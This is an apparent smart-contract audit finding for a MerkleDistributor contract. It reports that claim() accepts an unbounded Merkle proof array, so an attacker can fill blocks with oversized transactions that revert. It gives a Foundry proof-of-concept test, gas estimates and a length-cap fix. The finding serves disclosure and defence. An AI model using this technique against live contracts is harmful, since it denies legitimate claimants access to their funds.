### Title
Unbounded `merkleProof` Array in `claim()` Enables Block-Stuffing via Reverted Oversized Transactions — (`contracts/utils/MerkleDistributor/MerkleDistributor.sol`)

---

### Summary

`MerkleDistributor.claim()` accepts a `bytes32[] calldata merkleProof` with no length bound. `MerkleProofUpgradeable.processProof()` iterates over every element unconditionally. An attacker can submit transactions with arbitrarily large proof arrays that pass all cheap pre-checks, exhaust gas inside the loop, revert with `InvalidMerkleProof`, and still consume the full gas budget — filling blocks and temporarily locking out legitimate claimants.

---

### Finding Description

The `claim()` function signature is:

```solidity
function claim(
    uint256 index,
    address account,
    uint256 cumulativeAmount,
    bytes32[] calldata merkleProof   // ← no length cap
) external override whenNotPaused
``` [1](#0-0) 

Before reaching the expensive proof verification, the function performs only cheap checks:

1. `currentMerkleRoot != bytes32(0)` — one SLOAD
2. `index != 0 && index <= currentIndex` — one SLOAD; attacker uses `index = 1`
3. `!isClaimed(index, account)` — one SLOAD; attacker uses any unclaimed address (including their own) [2](#0-1) 

After passing those checks, execution reaches:

```solidity
if (!MerkleProofUpgradeable.verify(merkleProof, currentMerkleRoot, node)) {
    revert InvalidMerkleProof();
}
``` [3](#0-2) 

`MerkleProofUpgradeable.verify()` delegates to `processProof()`, which iterates over every element of the caller-supplied array with no size guard:

```solidity
function processProof(bytes32[] memory proof, bytes32 leaf) internal pure returns (bytes32) {
    bytes32 computedHash = leaf;
    for (uint256 i = 0; i < proof.length; i++) {   // ← unbounded
        computedHash = _hashPair(computedHash, proof[i]);
    }
    return computedHash;
}
``` [4](#0-3) 

Each `_hashPair` call costs ~30 gas (keccak256). A 500-element proof costs ~15,000 gas in hashing alone, plus calldata costs (~32 bytes × 500 × 16 gas = ~256,000 gas). A proof of ~18,000 elements can approach the 30M block gas limit in a single transaction.

Contrast this with EigenLayer's own beacon chain proof library, which enforces exact proof lengths before iterating:

```solidity
require(
    proof.proof.length == 32 * (BEACON_BLOCK_HEADER_TREE_HEIGHT),
    "BeaconChainProofs.verifyStateRoot: Proof has incorrect length"
);
``` [5](#0-4) 

`MerkleDistributor` has no equivalent guard.

Additionally, `account` is not restricted to `msg.sender`: [6](#0-5) 

This means the attacker does not need to own any valid claim — they can target any unclaimed address to pass the `isClaimed` check.

---

### Impact Explanation

**Medium. Unbounded gas consumption / Low. Block stuffing.**

A single `claim()` call with a maximally large proof array can consume up to the block gas limit before reverting. Multiple such transactions per block crowd out all legitimate claim transactions. Claimants cannot retrieve their tokens for as long as the attack is sustained. Funds are not permanently lost, but access is temporarily denied.

---

### Likelihood Explanation

**Medium.** The attacker requires no privileged access, no leaked keys, and no knowledge of valid Merkle leaves — only a valid `index` value (publicly readable from `currentIndex`) and any unclaimed address. The economic cost is real (attacker pays gas), but the attack is mechanically straightforward and requires no special tooling beyond a script that submits oversized-proof transactions.

---

### Recommendation

Add a maximum proof length check at the top of `claim()`, sized to the maximum expected tree depth (e.g., 32 for a tree of up to 2³² leaves):

```solidity
uint256 public constant MAX_PROOF_LENGTH = 32;

function claim(..., bytes32[] calldata merkleProof) external override whenNotPaused {
    if (merkleProof.length > MAX_PROOF_LENGTH) revert InvalidMerkleProof();
    // ... existing logic
}
```

This mirrors the pattern already used in `BeaconChainProofs.sol` and eliminates the unbounded gas path entirely.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "../../contracts/utils/MerkleDistributor/MerkleDistributor.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") { _mint(msg.sender, 1_000_000e18); }
}

contract MerkleDistributorGasTest is Test {
    MerkleDistributor distributor;
    MockToken token;

    function setUp() public {
        token = new MockToken();
        distributor = new MerkleDistributor();
        distributor.initialize(address(token), address(0xFEE), 0);
        token.transfer(address(distributor), 100_000e18);

        // Set a non-zero merkle root so the root check passes
        distributor.setMerkleRoot(bytes32(uint256(1)));
    }

    function test_oversizedProofExhaustsGas() public {
        // Build a 500-element junk proof
        bytes32[] memory bigProof = new bytes32[](500);
        for (uint256 i = 0; i < 500; i++) {
            bigProof[i] = bytes32(i + 1);
        }

        uint256 gasBefore = gasleft();

        // index=1 is valid (currentIndex==1 after setMerkleRoot)
        // account=address(this) is unclaimed
        // cumulativeAmount=1 — anything non-zero
        // proof is junk → will revert InvalidMerkleProof after iterating all 500 elements
        try distributor.claim(1, address(this), 1, bigProof) {} catch {}

        uint256 gasUsed = gasBefore - gasleft();
        emit log_named_uint("Gas consumed by oversized-proof claim (reverted)", gasUsed);

        // Assert meaningful gas was consumed despite revert
        assertGt(gasUsed, 100_000, "Expected significant gas consumption");
    }
}
```

Running this fork test will show that a reverted `claim()` with a 500-element proof consumes hundreds of thousands of gas. Scaling to ~18,000 elements approaches the 30M block gas limit, confirming that a small number of such transactions can monopolize an entire block and exclude all legitimate claimants.

### Citations

**File:** contracts/utils/MerkleDistributor/MerkleDistributor.sol (L97-106)
```text
    function claim(
        uint256 index,
        address account,
        uint256 cumulativeAmount,
        bytes32[] calldata merkleProof
    )
        external
        override
        whenNotPaused
    {
```

**File:** contracts/utils/MerkleDistributor/MerkleDistributor.sol (L107-117)
```text
        if (currentMerkleRoot == bytes32(0)) {
            revert ZeroValueProvided();
        }

        if (index == 0 || index > currentIndex) {
            revert InvalidIndex();
        }

        if (isClaimed(index, account)) {
            revert AlreadyClaimed();
        }
```

**File:** contracts/utils/MerkleDistributor/MerkleDistributor.sol (L121-123)
```text
        if (!MerkleProofUpgradeable.verify(merkleProof, currentMerkleRoot, node)) {
            revert InvalidMerkleProof();
        }
```

**File:** contracts/external/eigenlayer/libraries/BeaconChainProofs.sol (L102-105)
```text
        require(
            proof.proof.length == 32 * (BEACON_BLOCK_HEADER_TREE_HEIGHT),
            "BeaconChainProofs.verifyStateRoot: Proof has incorrect length"
        );
```
